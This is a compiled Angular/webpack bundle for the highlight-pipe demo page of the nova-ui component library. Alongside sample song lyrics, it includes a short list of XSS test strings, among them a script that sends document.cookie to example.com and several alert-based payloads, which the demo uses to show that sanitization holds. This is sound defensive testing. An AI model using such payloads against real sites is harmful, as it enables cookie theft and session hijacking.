(function () {
  var _templateObject, _templateObject2, _templateObject3, _templateObject4;

  function _taggedTemplateLiteral(strings, raw) { if (!raw) { raw = strings.slice(0); } return Object.freeze(Object.defineProperties(strings, { raw: { value: Object.freeze(raw) } })); }

  function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

  (window["webpackJsonp"] = window["webpackJsonp"] || []).push([["demo-highlight-highlight-module"], {
    /***/
    "1R5J":
    /*!************************************************************************************************************!*\
      !*** ./demo/src/components/demo/highlight sync !./node_modules/raw-loader/dist/cjs.js .*\.(ts|html|less)$ ***!
      \************************************************************************************************************/

    /*! no static exports found */

    /***/
    function R5J(module, exports, __webpack_require__) {
      var map = {
        "./highlight.example.component.html": "dIEH",
        "./highlight.example.component.ts": "efNr",
        "./highlight.module.ts": "yObk"
      };

      function webpackContext(req) {
        var id = webpackContextResolve(req);
        return __webpack_require__(id);
      }

      function webpackContextResolve(req) {
        if (!__webpack_require__.o(map, req)) {
          var e = new Error("Cannot find module '" + req + "'");
          e.code = 'MODULE_NOT_FOUND';
          throw e;
        }

        return map[req];
      }

      webpackContext.keys = function webpackContextKeys() {
        return Object.keys(map);
      };

      webpackContext.resolve = webpackContextResolve;
      module.exports = webpackContext;
      webpackContext.id = "1R5J";
      /***/
    },

    /***/
    "PRb3":
    /*!****************************************************************!*\
      !*** ./demo/src/components/demo/highlight/highlight.module.ts ***!
      \****************************************************************/

    /*! exports provided: HighlightModule */

    /***/
    function PRb3(module, __webpack_exports__, __webpack_require__) {
      "use strict";

      __webpack_require__.r(__webpack_exports__);
      /* harmony export (binding) */


      __webpack_require__.d(__webpack_exports__, "HighlightModule", function () {
        return HighlightModule;
      });
      /* harmony import */


      var _angular_forms__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(
      /*! @angular/forms */
      "3Pt+");
      /* harmony import */


      var _angular_router__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(
      /*! @angular/router */
      "tyNb");
      /* harmony import */


      var _nova_ui_bits__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(
      /*! @nova-ui/bits */
      "b5Xb");
      /* harmony import */


      var _highlight_example_component__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(
      /*! ./highlight.example.component */
      "RFgQ");
      /* harmony import */


      var _angular_core__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(
      /*! @angular/core */
      "fXoL");

      var routes = [{
        path: "",
        component: _highlight_example_component__WEBPACK_IMPORTED_MODULE_3__["HighlightExampleComponent"]
      }];

      var HighlightModule = function HighlightModule() {
        _classCallCheck(this, HighlightModule);
      };

      HighlightModule.ɵmod = _angular_core__WEBPACK_IMPORTED_MODULE_4__["ɵɵdefineNgModule"]({
        type: HighlightModule
      });
      HighlightModule.ɵinj = _angular_core__WEBPACK_IMPORTED_MODULE_4__["ɵɵdefineInjector"]({
        factory: function HighlightModule_Factory(t) {
          return new (t || HighlightModule)();
        },
        providers: [{
          provide: _nova_ui_bits__WEBPACK_IMPORTED_MODULE_2__["DEMO_PATH_TOKEN"],
          useFactory: function useFactory() {
            return __webpack_require__("1R5J");
          }
        }],
        imports: [[_nova_ui_bits__WEBPACK_IMPORTED_MODULE_2__["NuiDividerModule"], _angular_forms__WEBPACK_IMPORTED_MODULE_0__["FormsModule"], _angular_forms__WEBPACK_IMPORTED_MODULE_0__["ReactiveFormsModule"], _nova_ui_bits__WEBPACK_IMPORTED_MODULE_2__["NuiDocsModule"], _angular_router__WEBPACK_IMPORTED_MODULE_1__["RouterModule"].forChild(routes), _nova_ui_bits__WEBPACK_IMPORTED_MODULE_2__["NuiCommonModule"]], _angular_router__WEBPACK_IMPORTED_MODULE_1__["RouterModule"]]
      });

      (function () {
        (typeof ngJitMode === "undefined" || ngJitMode) && _angular_core__WEBPACK_IMPORTED_MODULE_4__["ɵɵsetNgModuleScope"](HighlightModule, {
          declarations: [_highlight_example_component__WEBPACK_IMPORTED_MODULE_3__["HighlightExampleComponent"]],
          imports: [_nova_ui_bits__WEBPACK_IMPORTED_MODULE_2__["NuiDividerModule"], _angular_forms__WEBPACK_IMPORTED_MODULE_0__["FormsModule"], _angular_forms__WEBPACK_IMPORTED_MODULE_0__["ReactiveFormsModule"], _nova_ui_bits__WEBPACK_IMPORTED_MODULE_2__["NuiDocsModule"], _angular_router__WEBPACK_IMPORTED_MODULE_1__["RouterModule"], _nova_ui_bits__WEBPACK_IMPORTED_MODULE_2__["NuiCommonModule"]],
          exports: [_angular_router__WEBPACK_IMPORTED_MODULE_1__["RouterModule"]]
        });
      })();
      /***/

    },

    /***/
    "RFgQ":
    /*!***************************************************************************!*\
      !*** ./demo/src/components/demo/highlight/highlight.example.component.ts ***!
      \***************************************************************************/

    /*! exports provided: HighlightExampleComponent */

    /***/
    function RFgQ(module, __webpack_exports__, __webpack_require__) {
      "use strict";

      __webpack_require__.r(__webpack_exports__);
      /* harmony export (binding) */


      __webpack_require__.d(__webpack_exports__, "HighlightExampleComponent", function () {
        return HighlightExampleComponent;
      });
      /* harmony import */


      var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(
      /*! @angular/core */
      "fXoL");
      /* harmony import */


      var _src_lib_docs_example_wrapper_example_wrapper_component__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(
      /*! ../../../../../src/lib/docs/example-wrapper/example-wrapper.component */
      "CVg4");
      /* harmony import */


      var _angular_common__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(
      /*! @angular/common */
      "ofXK");
      /* harmony import */


      var _src_lib_divider_divider_component__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(
      /*! ../../../../../src/lib/divider/divider.component */
      "UGtJ");
      /* harmony import */


      var _angular_forms__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(
      /*! @angular/forms */
      "3Pt+");
      /* harmony import */


      var _src_pipes_highlight_pipe__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(
      /*! ../../../../../src/pipes/highlight.pipe */
      "ZlWS");

      function HighlightExampleComponent_p_3_Template(rf, ctx) {
        if (rf & 1) {
          _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelement"](0, "p", 4);

          _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵpipe"](1, "nuiHighlight");
        }

        if (rf & 2) {
          var item_r2 = ctx.$implicit;

          _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵproperty"]("innerHTML", _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵpipeBind2"](1, 1, item_r2, item_r2), _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵsanitizeHtml"]);
        }
      }

      function HighlightExampleComponent_p_14_Template(rf, ctx) {
        if (rf & 1) {
          _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelement"](0, "p", 4);

          _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵpipe"](1, "nuiHighlight");
        }

        if (rf & 2) {
          var item_r3 = ctx.$implicit;

          var ctx_r1 = _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵnextContext"]();

          _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵproperty"]("innerHTML", _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵpipeBind2"](1, 1, item_r3, ctx_r1.search), _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵsanitizeHtml"]);
        }
      }

      var HighlightExampleComponent = function HighlightExampleComponent() {
        _classCallCheck(this, HighlightExampleComponent);

        this.contentString = $localize(_templateObject || (_templateObject = _taggedTemplateLiteral(["\n        Hello, it's me, I was wondering,<br>\n        If after all these years you'd like to meet to go over everything,<br>\n        They say that time's supposed to heal, yeah,<br>\n        But I ain't done much healing,<br>\n        <br>\n        Hello, can you hear me?,<br>\n        I'm in California dreaming about who we used to be,<br>\n        When we were younger and free,<br>\n        I've forgotten how it felt before the world fell at our feet,<br>\n        <br>\n        There's such a difference between us,<br>\n        And a million miles,<br>\n        <br>\n        Hello from the other side,<br>\n        I must've called a thousand times ,<br>\n        To tell you I'm sorry, for everything that I've done,<br>\n        But when I call you never seem to be home,<br>\n        <br>\n        Hello from the outside,<br>\n        At least I can say that I've tried ,<br>\n        To tell you I'm sorry, for breaking your heart,<br>\n        But it don't matter, it clearly doesn't tear you apart anymore\n    "])));
        this.contentStringIgnore = $localize(_templateObject2 || (_templateObject2 = _taggedTemplateLiteral(["\n        Hello, can you hear me?,<br>\n        I'm in California dreaming about who we used to be,<br>\n        When we were younger and free,<br>\n        I've forgotten how it felt before the world fell at our feet,\n    "])));
        this.xss = ["http://localhost:4200/#/highlight", "><SCRIPT>var+img=new+Image();img.src=\"http://example.com/\"%20+%20document.cookie;</SCRIPT>", "<div>inlinescript<SCRIPT>alert('XSS')</SCRIPT></div>", "<IMG SRC=\"javascript:alert('XSS');\">", "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>", "<a onclick=\"alert('XSS')\" class=\"someclass\">xss anchor</a>"];
        this.search = "c";
      };

      HighlightExampleComponent.ɵfac = function HighlightExampleComponent_Factory(t) {
        return new (t || HighlightExampleComponent)();
      };

      HighlightExampleComponent.ɵcmp = _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵdefineComponent"]({
        type: HighlightExampleComponent,
        selectors: [["nui-highlight"]],
        decls: 25,
        vars: 12,
        consts: function consts() {
          var i18n_0;

          if (typeof ngI18nClosureMode !== "undefined" && ngI18nClosureMode) {
            var MSG_EXTERNAL_3166421379558502876$$DEMO_SRC_COMPONENTS_DEMO_HIGHLIGHT_HIGHLIGHT_EXAMPLE_COMPONENT_TS_1 = goog.getMsg("Search Term:");
            i18n_0 = MSG_EXTERNAL_3166421379558502876$$DEMO_SRC_COMPONENTS_DEMO_HIGHLIGHT_HIGHLIGHT_EXAMPLE_COMPONENT_TS_1;
          } else {
            i18n_0 = $localize(_templateObject3 || (_templateObject3 = _taggedTemplateLiteral([":\u241F220f75007b39241cb07366aa68b51ffb7d2731f6\u241F3166421379558502876:Search Term:"])));
          }

          var i18n_2;

          if (typeof ngI18nClosureMode !== "undefined" && ngI18nClosureMode) {
            var MSG_EXTERNAL_7534204636174334747$$DEMO_SRC_COMPONENTS_DEMO_HIGHLIGHT_HIGHLIGHT_EXAMPLE_COMPONENT_TS_3 = goog.getMsg("Text below is piped via filter as well. But highlight doesn't appear. {$lineBreak} Class {$startItalicText}nui-ignore-highlight{$closeItalicText} on container prevents it.", {
              "lineBreak": "\uFFFD#21\uFFFD\uFFFD/#21\uFFFD",
              "startItalicText": "\uFFFD#22\uFFFD",
              "closeItalicText": "\uFFFD/#22\uFFFD"
            });
            i18n_2 = MSG_EXTERNAL_7534204636174334747$$DEMO_SRC_COMPONENTS_DEMO_HIGHLIGHT_HIGHLIGHT_EXAMPLE_COMPONENT_TS_3;
          } else {
            i18n_2 = $localize(_templateObject4 || (_templateObject4 = _taggedTemplateLiteral([":\u241Fb57a521a851d0412859b0c99ff6bc14d39092980\u241F7534204636174334747:Text below is piped via filter as well. But highlight doesn't appear. ", ":LINE_BREAK: Class ", ":START_ITALIC_TEXT:nui-ignore-highlight", ":CLOSE_ITALIC_TEXT: on container prevents it."])), "\uFFFD#21\uFFFD\uFFFD/#21\uFFFD", "\uFFFD#22\uFFFD", "\uFFFD/#22\uFFFD");
          }

          return [[3, "innerHTML", 4, "ngFor", "ngForOf"], ["for", "search"], i18n_0, ["id", "search", 3, "ngModel", "ngModelChange"], [3, "innerHTML"], [1, "nui-ignore-highlight"], [1, "nui-text-label"], i18n_2];
        },
        template: function HighlightExampleComponent_Template(rf, ctx) {
          if (rf & 1) {
            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelementStart"](0, "nui-example-wrapper");

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelementStart"](1, "h3");

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵtext"](2, "XSS + self highlight");

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelementEnd"]();

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵtemplate"](3, HighlightExampleComponent_p_3_Template, 2, 4, "p", 0);

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelement"](4, "nui-divider");

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelementStart"](5, "h3");

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵtext"](6, "XSS + search");

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelementEnd"]();

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelementStart"](7, "label", 1);

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵi18n"](8, 2);

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelementEnd"]();

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelement"](9, "br");

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelementStart"](10, "input", 3);

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵlistener"]("ngModelChange", function HighlightExampleComponent_Template_input_ngModelChange_10_listener($event) {
              return ctx.search = $event;
            });

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelementEnd"]();

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelement"](11, "br");

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelement"](12, "nui-divider");

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵtext"](13);

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵtemplate"](14, HighlightExampleComponent_p_14_Template, 2, 4, "p", 0);

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelement"](15, "nui-divider");

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelement"](16, "p", 4);

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵpipe"](17, "nuiHighlight");

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelementStart"](18, "section", 5);

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelementStart"](19, "p", 6);

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵi18nStart"](20, 7);

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelement"](21, "br");

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelement"](22, "i");

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵi18nEnd"]();

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelementEnd"]();

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelement"](23, "p", 4);

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵpipe"](24, "nuiHighlight");

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelementEnd"]();

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵelementEnd"]();
          }

          if (rf & 2) {
            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵadvance"](3);

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵproperty"]("ngForOf", ctx.xss);

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵadvance"](7);

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵproperty"]("ngModel", ctx.search);

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵadvance"](3);

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵtextInterpolate1"](" search = ", ctx.search, " ");

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵadvance"](1);

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵproperty"]("ngForOf", ctx.xss);

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵadvance"](2);

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵproperty"]("innerHTML", _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵpipeBind2"](17, 6, ctx.contentString, ctx.search), _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵsanitizeHtml"]);

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵadvance"](7);

            _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵproperty"]("innerHTML", _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵpipeBind2"](24, 9, ctx.contentStringIgnore, ctx.search), _angular_core__WEBPACK_IMPORTED_MODULE_0__["ɵɵsanitizeHtml"]);
          }
        },
        directives: [_src_lib_docs_example_wrapper_example_wrapper_component__WEBPACK_IMPORTED_MODULE_1__["ExampleWrapperComponent"], _angular_common__WEBPACK_IMPORTED_MODULE_2__["NgForOf"], _src_lib_divider_divider_component__WEBPACK_IMPORTED_MODULE_3__["DividerComponent"], _angular_forms__WEBPACK_IMPORTED_MODULE_4__["DefaultValueAccessor"], _angular_forms__WEBPACK_IMPORTED_MODULE_4__["NgControlStatus"], _angular_forms__WEBPACK_IMPORTED_MODULE_4__["NgModel"]],
        pipes: [_src_pipes_highlight_pipe__WEBPACK_IMPORTED_MODULE_5__["HighlightPipe"]],
        encapsulation: 2
      });
      /***/
    },

    /***/
    "dIEH":
    /*!*******************************************************************************************************************!*\
      !*** ./node_modules/raw-loader/dist/cjs.js!./demo/src/components/demo/highlight/highlight.example.component.html ***!
      \*******************************************************************************************************************/

    /*! exports provided: default */

    /***/
    function dIEH(module, __webpack_exports__, __webpack_require__) {
      "use strict";

      __webpack_require__.r(__webpack_exports__);
      /* harmony default export */


      __webpack_exports__["default"] = "<nui-example-wrapper>\n    <h3>XSS + self highlight</h3>\n    <p *ngFor=\"let item of xss\" [innerHTML]=\"item | nuiHighlight:item\"></p>\n    <nui-divider></nui-divider>\n    <h3>XSS + search</h3>\n    <label for=\"search\" i18n>Search Term:</label><br>\n    <input [(ngModel)]=\"search\" id=\"search\"><br>\n    <nui-divider></nui-divider>\n    search = {{search}}\n    <p *ngFor=\"let item of xss\" [innerHTML]=\"item | nuiHighlight:search\"></p>\n    <nui-divider></nui-divider>\n    <p [innerHTML]=\"contentString | nuiHighlight:search\"></p>\n    <section class=\"nui-ignore-highlight\">\n        <p class=\"nui-text-label\" i18n>Text below is piped via filter as well. But highlight doesn't appear. <br>\n            Class <i>nui-ignore-highlight</i> on container prevents it.</p>\n        <p [innerHTML]=\"contentStringIgnore | nuiHighlight:search\"></p>\n    </section>\n\n</nui-example-wrapper>\n";
      /***/
    },

    /***/
    "efNr":
    /*!*****************************************************************************************************************!*\
      !*** ./node_modules/raw-loader/dist/cjs.js!./demo/src/components/demo/highlight/highlight.example.component.ts ***!
      \*****************************************************************************************************************/

    /*! exports provided: default */

    /***/
    function efNr(module, __webpack_exports__, __webpack_require__) {
      "use strict";

      __webpack_require__.r(__webpack_exports__);
      /* harmony default export */


      __webpack_exports__["default"] = "import {Component} from \"@angular/core\";\n\n@Component({\n    selector: \"nui-highlight\",\n    templateUrl: \"./highlight.example.component.html\",\n})\nexport class HighlightExampleComponent {\n    public contentString = $localize `\n        Hello, it's me, I was wondering,<br>\n        If after all these years you'd like to meet to go over everything,<br>\n        They say that time's supposed to heal, yeah,<br>\n        But I ain't done much healing,<br>\n        <br>\n        Hello, can you hear me?,<br>\n        I'm in California dreaming about who we used to be,<br>\n        When we were younger and free,<br>\n        I've forgotten how it felt before the world fell at our feet,<br>\n        <br>\n        There's such a difference between us,<br>\n        And a million miles,<br>\n        <br>\n        Hello from the other side,<br>\n        I must've called a thousand times ,<br>\n        To tell you I'm sorry, for everything that I've done,<br>\n        But when I call you never seem to be home,<br>\n        <br>\n        Hello from the outside,<br>\n        At least I can say that I've tried ,<br>\n        To tell you I'm sorry, for breaking your heart,<br>\n        But it don't matter, it clearly doesn't tear you apart anymore\n    `;\n\n    public contentStringIgnore = $localize `\n        Hello, can you hear me?,<br>\n        I'm in California dreaming about who we used to be,<br>\n        When we were younger and free,<br>\n        I've forgotten how it felt before the world fell at our feet,\n    `;\n\n    public xss = [\n        `http://localhost:4200/#/highlight`,\n        `><SCRIPT>var+img=new+Image();img.src=\"http://example.com/\"%20+%20document.cookie;</SCRIPT>`,\n        `<div>inlinescript<SCRIPT>alert('XSS')</SCRIPT></div>`,\n        `<IMG SRC=\"javascript:alert('XSS');\">`,\n        `<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`,\n        `<a onclick=\"alert('XSS')\" class=\"someclass\">xss anchor</a>`,\n    ];\n\n    public search: string;\n\n    constructor() {\n        this.search = `c`;\n    }\n}\n";
      /***/
    },

    /***/
    "yObk":
    /*!******************************************************************************************************!*\
      !*** ./node_modules/raw-loader/dist/cjs.js!./demo/src/components/demo/highlight/highlight.module.ts ***!
      \******************************************************************************************************/

    /*! exports provided: default */

    /***/
    function yObk(module, __webpack_exports__, __webpack_require__) {
      "use strict";

      __webpack_require__.r(__webpack_exports__);
      /* harmony default export */


      __webpack_exports__["default"] = "import { NgModule } from \"@angular/core\";\nimport { FormsModule, ReactiveFormsModule } from \"@angular/forms\";\nimport { RouterModule } from \"@angular/router\";\nimport { DEMO_PATH_TOKEN, NuiDividerModule, NuiDocsModule, NuiCommonModule } from \"@nova-ui/bits\";\n\nimport { HighlightExampleComponent } from \"./highlight.example.component\";\n\nconst routes = [{\n    path: \"\",\n    component: HighlightExampleComponent,\n}];\n\n@NgModule({\n    imports: [\n        NuiDividerModule,\n        FormsModule,\n        ReactiveFormsModule,\n        NuiDocsModule,\n        RouterModule.forChild(routes),\n        NuiCommonModule,\n    ],\n    declarations: [\n        HighlightExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useFactory: () => (<any>require).context(`!!raw-loader!./`, true, /.*\\.(ts|html|less)$/),\n        },\n    ],\n    exports: [\n        RouterModule,\n    ],\n})\nexport class HighlightModule {\n}\n";
      /***/
    }
  }]);
})();
//# sourceMappingURL=demo-highlight-highlight-module-es5.js.map